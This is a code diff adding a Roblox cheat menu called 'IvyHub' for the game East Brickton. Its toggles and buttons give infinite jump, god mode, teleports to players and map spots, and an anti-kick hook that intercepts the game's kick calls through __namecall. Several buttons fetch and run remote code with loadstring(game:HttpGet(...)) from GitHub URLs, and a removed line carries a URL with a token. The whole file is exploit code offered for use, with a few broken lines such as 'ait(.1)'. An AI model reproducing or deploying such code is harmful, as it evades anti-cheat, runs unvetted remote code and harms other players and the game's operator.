@@ -40,7 +40,2971 @@ MainSection:NewButton("(Police-Belt)", "Ban-Warning", function()
 end)
 
 MainSection:NewButton("(Auto-Farm-OP USE ALT)", "", function()
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/sdotgo291/autofarmenvy/main/Autofarm?token=GHSAT0AAAAAACHDT4LYL4DQ6TZGRDNIBNGKZH3VJWQ'),true))() 
+
+local uilibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/9ivy/ivyhb/main/source.lua"))()
+local windowz = uilibrary:CreateWindow("IvyHub", "EastBrickton", false)
+
+local Page1 = windowz:CreatePage("Main")
+
+local Section1 = Page1:CreateSection("EB Toggle Stuff")
+
+Section1:CreateToggle("Fly Jump", {Toggled=false , Description = false}, function(Value)
+    infjmp = Value
+        game:GetService("UserInputService").jumpRequest:Connect(function()
+            if infjmp then
+                game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass"Humanoid":ChangeState("Jumping")
+                game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "flyjumping...", Icon = "rbxassetid://14445651728", Duration = 2,})
+            end
+        end)
+ end)
+
+ Section1:CreateToggle("God mode", {Toggled=false , Description = false}, function(goodie)
+   local togg = goodie
+    if togg then
+    local player = game.Players.LocalPlayer
+
+    if player.Character then
+    
+    if player.Character:FindFirstChild("Humanoid") then
+    
+    player.Character.Humanoid.Name = "1"
+    
+    end
+    
+    local l = player.Character["1"]:Clone()
+    
+    l.Parent = player.Character
+    
+    l.Name = "Humanoid"; wait(0.1)
+    
+    player.Character["1"]:Destroy()
+    
+    workspace.CurrentCamera.CameraSubject = player.Character.Humanoid
+    
+    player.Character.Animate.Disabled = true; wait(0.1)
+    
+    player.Character.Animate.Disabled = false
+    
+    end
+end
+   
+    if goodie then
+        game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "godded", Icon = "rbxassetid://14445651728", Duration = 2,})
+    end
+    print("finished.")
+ end)
+
+
+ 
+
+ local Section2 = Page1:CreateSection("EB Buttons Stuff")
+
+ Section2:CreateButton("Skip Char 1", function ()
+    repeat wait() until game:IsLoaded() and game:GetService'Players'.LocalPlayer
+
+    
+    local Menu = game:GetService'Players'.LocalPlayer:WaitForChild'PlayerGui':WaitForChild'MainMenu'
+    local Remote = Menu:WaitForChild'RemoteEvent'
+    
+    task.wait(0.35)
+    
+    if Menu:WaitForChild'Char1'.Value then
+        Remote:FireServer'LoadChar1'
+    end
+    
+    workspace.CurrentCamera.CameraType = 'Custom'
+    sethiddenproperty(game.Lighting, 'Technology', 'Compatibility')
+    game.Lighting:WaitForChild('Blur', 1000000):Destroy() 
+ end)
+
+ Section2:CreateButton("Skip Char 2", function ()
+    repeat wait() until game:IsLoaded() and game:GetService'Players'.LocalPlayer
+
+    
+    local Menu = game:GetService'Players'.LocalPlayer:WaitForChild'PlayerGui':WaitForChild'MainMenu'
+    local Remote = Menu:WaitForChild'RemoteEvent'
+    
+    task.wait(0.35)
+    
+    if Menu:WaitForChild'Char2'.Value then
+        Remote:FireServer'LoadChar2'
+    end
+    
+    workspace.CurrentCamera.CameraType = 'Custom'
+    sethiddenproperty(game.Lighting, 'Technology', 'Compatibility')
+    game.Lighting:WaitForChild('Blur', 1000000):Destroy()
+ end)
+
+ Section2:CreateButton("Anti Afk", function ()
+    local vu = game:GetService("VirtualUser")game:GetService("Players").LocalPlayer.Idled:connect(function() vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame) wait(1) vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)end)
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "Anti Afk", Icon = "rbxassetid://14445651728", Duration = 3,})
+ end)
+
+ Section2:CreateButton("Anti Kick", function ()
+      --// Cache
+
+local getgenv, getnamecallmethod, hookmetamethod, newcclosure, checkcaller, stringlower = getgenv, getnamecallmethod, hookmetamethod, newcclosure, checkcaller, string.lower
+
+--// Loaded check
+
+if getgenv().ED_AntiKick then return end
+
+--// Variables
+
+local Players, StarterGui, OldNamecall = game:GetService("Players"), game:GetService("StarterGui")
+
+--// Global Variables
+
+getgenv().ED_AntiKick = {
+	SendNotifications = true, -- Set to true if you want to get notified for every event
+	CheckCaller = false -- Set to true if you want to disable kicking by other executed scripts
+}
+
+--// Main
+
+OldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(...)
+	if (getgenv().ED_AntiKick.CheckCaller and not checkcaller() or true) and stringlower(getnamecallmethod()) == "kick" then
+		if getgenv().ED_AntiKick.SendNotifications then
+			StarterGui:SetCore("SendNotification", {
+				Title = "Ivy hub",
+				Text = "The script has successfully intercepted an attempted kick.",
+				Icon = "rbxassetid://14445651728",
+				Duration = 2,
+			})
+		end
+
+		return nil
+	end
+
+	return OldNamecall(...)
+end))
+
+if getgenv().ED_AntiKick.SendNotifications then
+	StarterGui:SetCore("SendNotification", {
+		Title = "Ivy hub",
+		Text = "Anti-Kick script loaded!",
+		Icon = "rbxassetid://14445651728",
+		Duration = 3,
+	})
+end
+ end)
+
+ Section2:CreateButton("Anti Fling", function ()
+      -- // Constants \\ --
+    -- [ Services ] --
+    local Services = setmetatable({}, {__index = function(Self, Index)
+        local NewService = game.GetService(game, Index)
+        if NewService then
+        Self[Index] = NewService
+        end
+        return NewService
+        end})
+        
+        -- [ LocalPlayer ] --
+        local LocalPlayer = Services.Players.LocalPlayer
+        
+        -- // Functions \\ --
+        local function PlayerAdded(Player)
+           local Detected = false
+           local Character;
+           local PrimaryPart;
+        
+           local function CharacterAdded(NewCharacter)
+               Character = NewCharacter
+               repeat
+                   wait()
+                   PrimaryPart = NewCharacter:FindFirstChild("HumanoidRootPart")
+               until PrimaryPart
+               Detected = false
+           end
+        
+           CharacterAdded(Player.Character or Player.CharacterAdded:Wait())
+           Player.CharacterAdded:Connect(CharacterAdded)
+           Services.RunService.Heartbeat:Connect(function()
+               if (Character and Character:IsDescendantOf(workspace)) and (PrimaryPart and PrimaryPart:IsDescendantOf(Character)) then
+                   if PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 100 then
+                       if Detected == false then
+                           game.StarterGui:SetCore("ChatMakeSystemMessage", {
+                               Text = "Fling Exploit detected, Player: " .. tostring(Player);
+                               Color = Color3.fromRGB(255, 200, 0);
+                           })
+                       end
+                       Detected = true
+                       for i,v in ipairs(Character:GetDescendants()) do
+                           if v:IsA("BasePart") then
+                               v.CanCollide = false
+                               v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+                               v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                               v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
+                           end
+                       end
+                       PrimaryPart.CanCollide = false
+                       PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+                       PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                       PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
+                   end
+               end
+           end)
+        end
+        
+        -- // Event Listeners \\ --
+        for i,v in ipairs(Services.Players:GetPlayers()) do
+           if v ~= LocalPlayer then
+               PlayerAdded(v)
+           end
+        end
+        Services.Players.PlayerAdded:Connect(PlayerAdded)
+        
+        local LastPosition = nil
+        Services.RunService.Heartbeat:Connect(function()
+           pcall(function()
+               local PrimaryPart = LocalPlayer.Character.PrimaryPart
+               if PrimaryPart.AssemblyLinearVelocity.Magnitude > 250 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 250 then
+                   PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+                   PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                   PrimaryPart.CFrame = LastPosition
+        
+                   game.StarterGui:SetCore("ChatMakeSystemMessage", {
+                       Text = "You were flung. Neutralizing velocity.";
+                       Color = Color3.fromRGB(255, 0, 0);
+                   })
+               elseif PrimaryPart.AssemblyLinearVelocity.Magnitude < 50 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 then
+                   LastPosition = PrimaryPart.CFrame
+               end
+           end)
+        end)
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "Anti Kick", Icon = "rbxassetid://14445651728", Duration = 3,})
+ end)
+
+ Section2:CreateButton("rejoin", function ()
+    local TeleportService = game:GetService("TeleportService")
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+     
+    local Rejoin = coroutine.create(function()
+        local Success, ErrorMessage = pcall(function()
+            TeleportService:Teleport(game.PlaceId, LocalPlayer)
+        end)
+     
+        if ErrorMessage and not Success then
+            warn(ErrorMessage)
+        end
+    end)
+     
+    coroutine.resume(Rejoin)
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "rejoing..", Icon = "rbxassetid://14445651728", Duration = 3,})
+ end)
+
+ local Section3 = Page1:CreateSection("FE Stuff")
+
+ Section3:CreateButton("Infinite Yield", function ()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "Infinite Yield Loaded", Icon = "rbxassetid://14445651728", Duration = 3,})
+ end)
+
+ local Page2 = windowz:CreatePage("EB Player")
+
+ local Section1 = Page2:CreateSection("Config")
+
+ players = {}
+ 
+for i,v in pairs(game:GetService("Players"):GetChildren()) do
+   table.insert(players,v.Name)
+end
+
+Section1:CreateDropdown("Dropdown ", {
+    List = players,
+    Default = "None"}, function(abc)
+        Select = abc
+ end)
+
+ Section1:CreateButton("Refresh Player List", function ()
+    table.clear(players)
+    for i,v in pairs(game:GetService("Players"):GetChildren()) do
+       table.insert(players,v.Name)
+    end
+ end)
+
+ local Section2 = Page2:CreateSection("Actions")
+
+ Section2:CreateButton("Teleport to player", function ()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[Select].Character.HumanoidRootPart.CFrame
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[Select].Character.HumanoidRootPart.CFrame
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[Select].Character.HumanoidRootPart.CFrame
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[Select].Character.HumanoidRootPart.CFrame
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+ end)
+
+ Section2:CreateToggle("Loop tp", {Toggled=false , Description = false}, function(ezzz)
+    local togg = ezzz
+        while togg do
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[Select].Character.HumanoidRootPart.CFrame   
+    end
+ end)
+
+ Section2:CreateToggle("view player", {Toggled=false , Description = false}, function(ezz)
+    local togge = ezz
+    if togge then
+        game.Workspace.Camera.CameraSubject = game.Players[Select].Character.Humanoid
+    end
+
+    if not togge then
+        game.Workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
+    end
+ end)
+
+ local Page1 = windowz:CreatePage("Teleports")
+
+ local Section1 = Page1:CreateSection("Job Spawns")
+
+ Section1:CreateButton("Fuegoz", function ()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-365.113708, 4.1672368, -55.5204468, 0.977084637, -2.76288752e-08, 0.212851077, 2.68529892e-08, 1, 6.53617915e-09, -0.212851077, -6.70712763e-10, 0.977084637)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-365.113708, 4.1672368, -55.5204468, 0.977084637, -2.76288752e-08, 0.212851077, 2.68529892e-08, 1, 6.53617915e-09, -0.212851077, -6.70712763e-10, 0.977084637)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-365.113708, 4.1672368, -55.5204468, 0.977084637, -2.76288752e-08, 0.212851077, 2.68529892e-08, 1, 6.53617915e-09, -0.212851077, -6.70712763e-10, 0.977084637)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-365.113708, 4.1672368, -55.5204468, 0.977084637, -2.76288752e-08, 0.212851077, 2.68529892e-08, 1, 6.53617915e-09, -0.212851077, -6.70712763e-10, 0.977084637)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-365.113708, 4.1672368, -55.5204468, 0.977084637, -2.76288752e-08, 0.212851077, 2.68529892e-08, 1, 6.53617915e-09, -0.212851077, -6.70712763e-10, 0.977084637)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "tped safetly", Icon = "rbxassetid://14445651728", Duration = 2,})
+end)
+----
+Section1:CreateButton("LitFits", function ()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-61.6563377, 4.06701088, 157.633636, 0.79819572, 4.78679407e-09, -0.602398217, -2.08302708e-09, 1, 5.18615506e-09, 0.602398217, -2.8847551e-09, 0.79819572)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-61.6563377, 4.06701088, 157.633636, 0.79819572, 4.78679407e-09, -0.602398217, -2.08302708e-09, 1, 5.18615506e-09, 0.602398217, -2.8847551e-09, 0.79819572)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-61.6563377, 4.06701088, 157.633636, 0.79819572, 4.78679407e-09, -0.602398217, -2.08302708e-09, 1, 5.18615506e-09, 0.602398217, -2.8847551e-09, 0.79819572)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-61.6563377, 4.06701088, 157.633636, 0.79819572, 4.78679407e-09, -0.602398217, -2.08302708e-09, 1, 5.18615506e-09, 0.602398217, -2.8847551e-09, 0.79819572)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-61.6563377, 4.06701088, 157.633636, 0.79819572, 4.78679407e-09, -0.602398217, -2.08302708e-09, 1, 5.18615506e-09, 0.602398217, -2.8847551e-09, 0.79819572)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "tped safetly", Icon = "rbxassetid://14445651728", Duration = 2,})
+end)
+
+---
+Section1:CreateButton("Actor", function ()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(292.723724, 15.5037832, 52.7262878, 0.998323262, -2.07895656e-09, -0.0578847155, 3.25743454e-09, 1, 2.02646966e-08, 0.0578847155, -2.04192734e-08, 0.998323262)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(292.723724, 15.5037832, 52.7262878, 0.998323262, -2.07895656e-09, -0.0578847155, 3.25743454e-09, 1, 2.02646966e-08, 0.0578847155, -2.04192734e-08, 0.998323262)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(292.723724, 15.5037832, 52.7262878, 0.998323262, -2.07895656e-09, -0.0578847155, 3.25743454e-09, 1, 2.02646966e-08, 0.0578847155, -2.04192734e-08, 0.998323262)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(292.723724, 15.5037832, 52.7262878, 0.998323262, -2.07895656e-09, -0.0578847155, 3.25743454e-09, 1, 2.02646966e-08, 0.0578847155, -2.04192734e-08, 0.998323262)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    ait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(292.723724, 15.5037832, 52.7262878, 0.998323262, -2.07895656e-09, -0.0578847155, 3.25743454e-09, 1, 2.02646966e-08, 0.0578847155, -2.04192734e-08, 0.998323262)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "tped safetly", Icon = "rbxassetid://14445651728", Duration = 2,})
+end)
+---
+Section1:CreateButton("LaFancy", function ()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(111.114746, 4.06701088, 342.601807, -0.0114012966, 5.46411734e-08, -0.999935031, 8.47426591e-08, 1, 5.36784874e-08, 0.999935031, -8.41251406e-08, -0.0114012966)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(111.114746, 4.06701088, 342.601807, -0.0114012966, 5.46411734e-08, -0.999935031, 8.47426591e-08, 1, 5.36784874e-08, 0.999935031, -8.41251406e-08, -0.0114012966)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(111.114746, 4.06701088, 342.601807, -0.0114012966, 5.46411734e-08, -0.999935031, 8.47426591e-08, 1, 5.36784874e-08, 0.999935031, -8.41251406e-08, -0.0114012966)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(111.114746, 4.06701088, 342.601807, -0.0114012966, 5.46411734e-08, -0.999935031, 8.47426591e-08, 1, 5.36784874e-08, 0.999935031, -8.41251406e-08, -0.0114012966)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(111.114746, 4.06701088, 342.601807, -0.0114012966, 5.46411734e-08, -0.999935031, 8.47426591e-08, 1, 5.36784874e-08, 0.999935031, -8.41251406e-08, -0.0114012966)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "tped safetly", Icon = "rbxassetid://14445651728", Duration = 2,})
+end)
+--
+Section1:CreateButton("Fishery", function ()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-760.925415, 4.60719872, -79.6439438, -0.0780455396, -4.77841633e-09, -0.996949792, -2.3480915e-09, 1, -4.60921745e-09, 0.996949792, 1.98120031e-09, -0.0780455396)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-760.925415, 4.60719872, -79.6439438, -0.0780455396, -4.77841633e-09, -0.996949792, -2.3480915e-09, 1, -4.60921745e-09, 0.996949792, 1.98120031e-09, -0.0780455396)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-760.925415, 4.60719872, -79.6439438, -0.0780455396, -4.77841633e-09, -0.996949792, -2.3480915e-09, 1, -4.60921745e-09, 0.996949792, 1.98120031e-09, -0.0780455396)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-760.925415, 4.60719872, -79.6439438, -0.0780455396, -4.77841633e-09, -0.996949792, -2.3480915e-09, 1, -4.60921745e-09, 0.996949792, 1.98120031e-09, -0.0780455396)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-760.925415, 4.60719872, -79.6439438, -0.0780455396, -4.77841633e-09, -0.996949792, -2.3480915e-09, 1, -4.60921745e-09, 0.996949792, 1.98120031e-09, -0.0780455396)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "tped safetly", Icon = "rbxassetid://14445651728", Duration = 2,})
+end)
+
+--
+Section1:CreateButton("High Priest", function ()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-655.344788, 4.19675684, -4.86942863, 0.166582808, -1.08068301e-08, 0.986027479, -5.07992048e-08, 1, 1.95421581e-08, -0.986027479, -5.33447988e-08, 0.166582808)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-655.344788, 4.19675684, -4.86942863, 0.166582808, -1.08068301e-08, 0.986027479, -5.07992048e-08, 1, 1.95421581e-08, -0.986027479, -5.33447988e-08, 0.166582808)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-655.344788, 4.19675684, -4.86942863, 0.166582808, -1.08068301e-08, 0.986027479, -5.07992048e-08, 1, 1.95421581e-08, -0.986027479, -5.33447988e-08, 0.166582808)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-655.344788, 4.19675684, -4.86942863, 0.166582808, -1.08068301e-08, 0.986027479, -5.07992048e-08, 1, 1.95421581e-08, -0.986027479, -5.33447988e-08, 0.166582808)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-655.344788, 4.19675684, -4.86942863, 0.166582808, -1.08068301e-08, 0.986027479, -5.07992048e-08, 1, 1.95421581e-08, -0.986027479, -5.33447988e-08, 0.166582808)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "tped safetly", Icon = "rbxassetid://14445651728", Duration = 2,})
+end)
+
+--
+Section1:CreateButton("EMS", function ()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(463.78064, 4.0670104, 275.727936, -0.000924163149, -2.54360828e-07, -0.999999583, -8.14840584e-10, 1, -2.54360174e-07, 0.999999583, 5.79769954e-10, -0.000924163149)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(463.78064, 4.0670104, 275.727936, -0.000924163149, -2.54360828e-07, -0.999999583, -8.14840584e-10, 1, -2.54360174e-07, 0.999999583, 5.79769954e-10, -0.000924163149)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(463.78064, 4.0670104, 275.727936, -0.000924163149, -2.54360828e-07, -0.999999583, -8.14840584e-10, 1, -2.54360174e-07, 0.999999583, 5.79769954e-10, -0.000924163149)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(463.78064, 4.0670104, 275.727936, -0.000924163149, -2.54360828e-07, -0.999999583, -8.14840584e-10, 1, -2.54360174e-07, 0.999999583, 5.79769954e-10, -0.000924163149)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
